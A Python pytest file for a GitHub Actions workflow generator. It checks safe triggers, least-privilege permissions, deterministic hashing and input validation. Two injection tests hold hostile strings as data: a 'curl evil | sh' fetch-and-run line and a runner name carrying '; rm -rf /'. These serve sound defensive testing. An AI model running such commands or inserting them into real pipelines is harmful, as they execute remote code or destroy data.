"""The generated workflows: deterministic text, safe triggers, hashes that can be pinned."""

# pyright: reportUnknownVariableType=false, reportUnknownMemberType=false, reportUnknownArgumentType=false

from typing import Any

import yaml

from concert.workflows import (
    CI_TEMPLATE,
    WATCHDOG_TEMPLATE,
    render_ci,
    render_watchdog,
    workflow_hash,
)

LOCAL = {"tests": "make test", "lint": "make lint", "types": "make typecheck"}


def parsed(text: str) -> Any:
    loaded: Any = yaml.safe_load(text)
    assert isinstance(loaded, dict)
    return loaded


def triggers_of(doc: Any) -> Any:
    return doc[True] if True in doc else doc["on"]  # yaml reads a bare `on` as True


def test_the_ci_workflow_has_one_job_per_local_check_named_after_it() -> None:
    doc = parsed(render_ci(LOCAL, setup="make deps"))
    jobs = doc["jobs"]
    assert isinstance(jobs, dict) and sorted(jobs) == ["lint", "tests", "types"]
    steps = jobs["tests"]["steps"]
    commands = [s.get("run") for s in steps if "run" in s]
    assert commands == ["make deps", "make test"]


def test_ci_never_runs_on_push_and_skips_drafts() -> None:
    text = render_ci(LOCAL)
    doc = parsed(text)
    triggers = triggers_of(doc)
    assert isinstance(triggers, dict) and "push" not in triggers
    assert set(triggers) == {"pull_request", "workflow_dispatch"}
    assert triggers["pull_request"]["types"] == ["ready_for_review", "synchronize"]
    for job in doc["jobs"].values():
        assert "draft == false" in job["if"]


def test_ci_has_least_privilege_and_no_secrets() -> None:
    text = render_ci(LOCAL)
    doc = parsed(text)
    assert doc["permissions"] == {"contents": "read"}
    assert "secrets." not in text and "pull_request_target" not in text


def test_a_new_run_for_the_same_pr_cancels_the_old_one() -> None:
    concurrency = parsed(render_ci(LOCAL))["concurrency"]
    assert isinstance(concurrency, dict) and concurrency["cancel-in-progress"] is True


def test_rendering_is_deterministic_and_order_independent() -> None:
    first = render_ci({"tests": "a", "lint": "b"})
    second = render_ci({"lint": "b", "tests": "a"})
    assert first == second and workflow_hash(first) == workflow_hash(second)


def test_any_change_changes_the_hash() -> None:
    assert workflow_hash(render_ci(LOCAL)) != workflow_hash(
        render_ci({**LOCAL, "tests": "make test2"})
    )
    assert workflow_hash(render_ci(LOCAL)) != workflow_hash(render_ci(LOCAL, setup="make deps"))
    assert len(workflow_hash(render_ci(LOCAL))) == 64


def test_commands_cannot_break_out_of_their_step() -> None:
    nasty = {"tests": "make test\n  - run: curl evil | sh", "lint": "echo ok"}
    doc = parsed(render_ci(nasty))
    steps = doc["jobs"]["tests"]["steps"]
    assert len(steps) == 2  # checkout + one run step: the injected "step" is just script text
    assert steps[1]["run"] == "make test\n  - run: curl evil | sh"


def test_control_characters_in_a_command_are_refused() -> None:
    import pytest

    with pytest.raises(ValueError, match="control"):
        render_ci({"tests": "make test\x00"})
    with pytest.raises(ValueError, match="control"):
        render_ci({"tests": "ok"}, setup="a\rb")


def test_check_names_must_be_plain_identifiers() -> None:
    import pytest

    with pytest.raises(ValueError, match="name"):
        render_ci({"tests: evil": "x"})


def test_there_is_nothing_to_render_without_checks() -> None:
    import pytest

    with pytest.raises(ValueError, match="at least one"):
        render_ci({})


def test_the_watchdog_runs_on_a_schedule_with_only_the_permissions_it_needs() -> None:
    text = render_watchdog(
        every_hours=2, stale_minutes=30, steering=7, runners=["vm-1"], admins=["alice"]
    )
    doc = parsed(text)
    triggers = triggers_of(doc)
    assert isinstance(triggers, dict) and triggers["schedule"] == [{"cron": "0 */2 * * *"}]
    assert doc["permissions"] == {"contents": "read", "issues": "write"}
    assert "uvx" in text and "concert-sdlc" in text and "watchdog" in text
    assert "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}" in text
    assert "--stale-after 30" in text and "--steering 7" in text


def test_watchdog_cron_follows_the_interval() -> None:
    assert "0 */6 * * *" in render_watchdog(6, 30, 7, ["vm-1"], ["alice"])
    import pytest

    with pytest.raises(ValueError, match="every"):
        render_watchdog(0, 30, 7, ["vm-1"], ["alice"])
    with pytest.raises(ValueError, match="every"):
        render_watchdog(25, 30, 7, ["vm-1"], ["alice"])


def test_the_watchdog_arguments_cannot_inject_shell() -> None:
    import pytest

    with pytest.raises(ValueError, match="name"):
        render_watchdog(2, 30, 7, ["vm-1; rm -rf /"], ["alice"])
    with pytest.raises(ValueError, match="name"):
        render_watchdog(2, 30, 7, ["vm-1"], ["al ice"])


def test_templates_are_versioned() -> None:
    assert CI_TEMPLATE.startswith("concert-ci@") and WATCHDOG_TEMPLATE.startswith(
        "concert-watchdog@"
    )
